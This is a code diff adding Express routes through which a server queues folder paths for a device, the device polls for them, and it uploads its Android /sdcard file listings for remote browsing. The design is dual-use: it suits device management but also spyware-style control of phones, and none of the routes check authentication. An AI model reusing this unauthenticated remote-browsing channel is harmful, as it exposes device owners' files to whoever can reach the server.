@@ -171,4 +171,49 @@ router.get('/battery/:deviceId', (req, res) => {
   res.json({ telemetry });
 });
 
+// File & Storage Explorer Hub
+const liveFilesStorage = new Map<string, { currentPath: string; files: Array<any> }>();
+const pendingFileCommands = new Map<string, string>(); // deviceId -> folderPath
+
+router.get('/files/list/:deviceId', (req, res) => {
+  const devId = req.params.deviceId;
+  const data = liveFilesStorage.get(devId) || {
+    currentPath: '/sdcard',
+    files: [
+      { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true },
+      { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true },
+      { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true },
+      { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true },
+      { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true },
+      { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true },
+    ]
+  };
+  res.json(data);
+});
+
+router.post('/files/explore', (req, res) => {
+  const { deviceId, path } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  const targetPath = path || '/sdcard';
+  pendingFileCommands.set(devId, targetPath);
+  res.json({ success: true, message: `Browsing ${targetPath}` });
+});
+
+router.get('/files/command/:deviceId', (req, res) => {
+  const devId = req.params.deviceId;
+  const path = pendingFileCommands.get(devId) || null;
+  if (path) pendingFileCommands.delete(devId);
+  res.json({ path });
+});
+
+router.post('/files/sync', (req, res) => {
+  const { deviceId, currentPath, files } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  liveFilesStorage.set(devId, {
+    currentPath: currentPath || '/sdcard',
+    files: files || []
+  });
+  res.status(201).json({ success: true });
+});
+
 export default router;
